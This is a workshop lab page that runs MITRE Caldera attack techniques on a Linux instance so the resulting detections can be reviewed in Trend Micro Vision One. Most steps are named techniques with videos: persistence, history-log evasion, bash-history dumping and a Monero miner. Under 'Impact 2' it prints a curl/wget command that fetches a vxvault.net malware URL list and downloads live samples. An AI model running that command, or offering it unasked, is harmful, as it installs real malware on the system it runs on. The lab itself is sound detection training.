---
title: "Linux"
chapter: false
weight: 41
pre: "<b>4.1 </b>"
---
## Linux - Detection Mode
---

<b>Before you start this lab, make sure the C1WS Policy attached to the Linux Instance is the "demo > visionone > detection mode" policy.</b>

### ATT&CK Phases
#### Reconnaissance
This step was skipped because we knew the target of our attack (Windows and Linux Instances)

---
#### Resource Development
We used Mitre Caldera to generate the payloads used to compromise our targets

---
#### Initial Access and Execution
We deployed the malicious payloads manually to the Windows and Linux Instances. In a Real-world scenario, we could have used a Malicious Email message, including the link to the malicious files. In this way, compromising the target computers.

---
#### Persistence
Using Mitre Caldera, you can deploy additional backdoors that will ensure you can keep accessing the affected computers in the future:

In our case, we can run a remote instruction on the affected Linux computer and deploy a secondary agent (bot).

{{< youtube id="926KXvQiQ-0" >}}

---
#### Privilege Escalation
Using Mitre Caldera, you can deploy the Technique "Weak executable files (T1574.010) - Locate and infect files with weak but executable perms". It will help to to expand the impact of this attack and get additional permissions on the affected OS.

{{< youtube id="NOQU4tKmqiQ" >}}

---
#### Defense Evasion
Using Mitre Caldera, you can deploy the Technique "Avoid logs (T1070.003) - Stop terminal from logging history". In this way, the instructions you are executing will not be logged by the OS, making hard to the SOC Team to investigate and track the malicious instructions executed on this attack.

{{< youtube id="pFkTQmuWyGw" >}}

---
#### Credential Access
Using Mitre Caldera, you can deploy the Technique "Dump history (T1552.003) - Get contents of bash history". You may find sensitive information with this technique.

{{< youtube id="2KH_YkmH_6A" >}}

---
#### Discovery
Using Mitre Caldera, you can deploy the Technique "Find System Network Connections (T1049) - Find System Network Connections". You may find additional targets for this attack (Lateral Movement for example).

{{< youtube id="CbS21y0QvD4" >}}

---
#### Lateral Movement
Under development..


---
#### Command & Control
You can use the same tatics used on the step "Persistence", or even using other customm tools to interact with the C&C Server.

---
#### Collection
Using Mitre Caldera, you can deploy the Technique "Find files (T1005) - Locate files deemed sensitive". Using this technique you can search for sensitive date hosted on the affected computers.

{{< youtube id="AREqI9QRxsQ" >}}

---
#### Exfiltration
Under development..

---
#### Impact 1
Using Mitre Caldera, you can deploy the Techniques "Crypto (Monero) Mining (T1496) - Download and execute Monero miner (xmrig) for 1 minute" and "Leave note (T1491) - Create a text file for the user to find". With this two techniques, you can create an impact that will affect the performance and expose the affected server to other risks, and also leave a note to tell the target of the attack about your intentions and what you have done so far.

{{< youtube id="zfGupkq1HVw" >}}

#### Impact 2
Using Mitre Caldera, you can deploy the following manual instruction. It will make the affected computer to download 0-day malwares from live repositories in the internet.

        curl http://vxvault.net/URL_List.php > urls.txt
        wget -i urls.txt --tries=1

{{< youtube id="ldIEFNi7EiE" >}}

---
## Reviewing the Detections 
Review your Vision One Portal (Risk Insights and XDR / Workbenchs and OAT) searching for the evidences of the instructions executed during this demo.